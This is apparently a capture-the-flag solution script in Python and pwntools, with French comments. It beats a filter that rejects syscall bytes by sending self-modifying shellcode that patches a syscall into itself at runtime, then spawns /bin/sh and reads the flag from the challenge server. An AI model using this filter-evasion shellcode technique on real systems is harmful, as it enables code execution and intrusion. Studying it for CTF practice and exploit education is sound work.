#!/usr/bin/env python3
# 5 - asm modifier (500 pts) : buffer RWX a adresse connue 0x123412340000.
# check() rejette tout octet pair 0f 05 (syscall) dans l'input. Parade = shellcode AUTO-MODIFIANT :
#   - on n'envoie jamais 0f 05 ;
#   - on ECRIT 0f 05 a l'execution par-dessus un placeholder (2 nops), puis on tombe dedans.
#   - meme l'immediat 0x050f contient les octets 0f 05 -> on le FABRIQUE : 0x0a1e >> 1 = 0x050f.
# Puis execve("/bin/sh").
from pwn import *
context.arch = "amd64"
context.log_level = "warning"

HOST, PORT = "chal.sigpwny.com", 9004

sc = """
    lea rdi, [rip + trigger]   /* adresse du placeholder (position-independant) */
    mov ax, 0x0a1e
    shr ax, 1                  /* ax = 0x050f = octets 'syscall', sans l'ecrire en clair */
    mov [rdi], ax              /* patch : nop;nop -> syscall */

    /* execve("/bin/sh", 0, 0) */
    lea rdi, [rip + binsh]
    xor esi, esi
    xor edx, edx
    mov eax, 59
trigger:
    nop
    nop                        /* <- devient 0f 05 (syscall) a l'execution */
    hlt
binsh:
    .string "/bin/sh"
"""
code = asm(sc)
assert b"\x0f\x05" not in code, "le blob contient 0f05, check() le refuserait !"
log.warning("shellcode %d octets, pas de 0f05: OK" % len(code))

io = remote(HOST, PORT)
io.recvuntil(b"no syscalling!:")
io.send(code)
io.sendline(b"cat flag.txt")
io.sendline(b"exit")
print(io.recvall(timeout=5).decode(errors="replace"))
